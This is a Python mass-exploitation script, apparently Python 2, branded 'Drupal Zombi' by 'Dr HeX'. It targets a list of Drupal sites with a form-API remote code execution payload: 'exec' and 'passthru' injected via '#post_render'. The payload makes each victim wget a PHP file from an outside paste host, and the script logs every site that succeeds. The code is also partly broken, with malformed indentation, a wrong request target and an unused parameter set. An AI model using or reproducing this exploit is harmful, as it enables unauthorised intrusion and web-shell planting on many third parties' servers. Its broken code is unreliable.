#!/usr/bin/env python
#Create By Dr HeX on 18-05-2018
import sys
import requests
from multiprocessing.dummy import Pool
import time
import random
import urllib3
urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    exit('Usage: hex.py list.txt')
def progressbar(it, prefix = "", size = 1000):
    count = len(it)
    def _show(_i):
        x = int(size*_i/count)
        sys.stdout.write("%s[%s%s] %i/%i\r" % (prefix, "#"*x, "_"*(size-x), _i, count))
        sys.stdout.flush()
    _show(0)
    for i, item in enumerate(it):
        yield item
        _show(i+1)
    sys.stdout.write("\n")
    sys.stdout.flush()
toolbar_width = 30

sys.stdout.write(":%s:" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1))

for i in xrange(toolbar_width):
    time.sleep(0.01)

    sys.stdout.write("*")
    sys.stdout.flush()

sys.stdout.write("\n")
def print_logo():
    clear = "\x1b[0m"
    colors = [31, 32, 33, 34, 35, 36]

logo = """
[+][+][+]---------------------------[+][+][+]
[+][+][+ ]    Drupal Zombi V 5.7    [+][+][+]
[+][+][+]      Coded by Dr HeX      [+][+][+]
[+][+][+]    Email:pz@hotmail.com   [+][+][+]
[+][+][+]---------------------------[+][+][+]
"""
    for line in logo.split("\n"):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
print_logo()

payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://hastebin.com/raw/haputovika.php'}
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'}
first_get_params = {
    'q':'user/password',
    'name[#post_render][]':'passthru',
    'name[#markup]':'wget https://hastebin.com/raw/haputovika.php',
    'name[#type]':'markup'
}
first_post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
headers1 = {'User-Agent': 'Mozilla 5.0'}

	
def run(u):
    try:
        url = u + 'haputovika.php'
        r = requests.post(url, data=payload, verify=False, headers=headers)
        if 'Dr HeX' in requests.get(u+'haputovika.php', verify=False, headers=headers).text:
            print (u+'', ' ===> [+] True Success ! \n')
            with open('result.txt', mode='a') as d:
             d.write(u + '\n')
				
  
			
        else:
            print(u, "==> False")
			
    except:
        pass

mp = Pool(150)
mp.map(run, target)
mp.close()
mp.join()